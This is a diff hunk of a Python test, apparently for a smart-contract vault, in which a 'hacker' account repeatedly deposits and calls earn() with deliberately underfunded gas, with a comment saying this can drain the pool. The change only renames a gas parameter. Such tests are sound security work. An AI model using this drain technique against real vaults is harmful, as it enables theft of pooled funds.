@@ -20,7 +20,7 @@ def test_proxy_earn(accounts, Token, Contract):
     for _ in range(80):  # Do this a bunch of times and you can drain the pool
         vault.deposit(ycrv.balanceOf(hacker) // 2, {"from": hacker})  # Deposit half
         vault.earn(
-            {"from": hacker, "gas": 300000}
+            {"from": hacker, "gas_limit": 300000}
         )  # Purposely-underfund gas (fails to update)
         vault.deposit(
             ycrv.balanceOf(hacker), {"from": hacker}
